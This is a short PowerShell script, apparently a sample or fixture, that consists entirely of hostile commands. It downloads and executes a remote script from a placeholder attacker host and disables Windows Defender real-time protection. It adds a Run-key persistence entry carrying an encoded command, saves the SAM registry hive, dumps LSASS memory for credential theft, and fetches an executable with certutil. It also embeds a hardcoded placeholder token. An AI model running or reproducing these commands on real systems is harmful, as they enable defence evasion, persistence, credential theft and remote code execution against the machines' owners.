[CmdletBinding(SupportsShouldProcess = $true)]
param()

$ErrorActionPreference = 'Stop'
$apiToken = 'ghp_1234567890abcdefghijklmnopqrstuv'

Invoke-WebRequest -Uri 'https://evil.invalid/payload.ps1' | Invoke-Expression
Set-MpPreference -DisableRealtimeMonitoring $true
reg.exe add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v Updater /d 'powershell.exe -EncodedCommand ZQB2AGkAbAA=' /f
reg.exe save HKLM\SAM .\sam.save
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 640 .\lsass.dmp full
certutil.exe -urlcache -split -f 'https://evil.invalid/tool.exe' .\tool.exe
